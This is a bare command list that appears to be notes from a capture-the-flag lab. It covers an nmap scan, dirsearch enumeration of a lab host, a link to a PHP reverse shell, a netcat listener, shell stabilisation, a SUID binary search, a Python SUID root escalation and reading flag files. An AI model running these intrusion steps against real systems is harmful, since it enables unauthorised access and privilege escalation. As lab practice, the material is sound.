nmap -sV -sC -F









sudo dirsearch --full-url -u http://10.10.242.162/ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt









https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php









ip a









nc -lvnp 1234









cd var/www/












cat user.txt









python -c 'import pty; pty.spawn("/bin/bash")'









find / -perm -u=s -type f 2>/dev/null









python -c 'import os; os.execl("/bin/sh", "sh", "-p")'

cd root

cat root.txt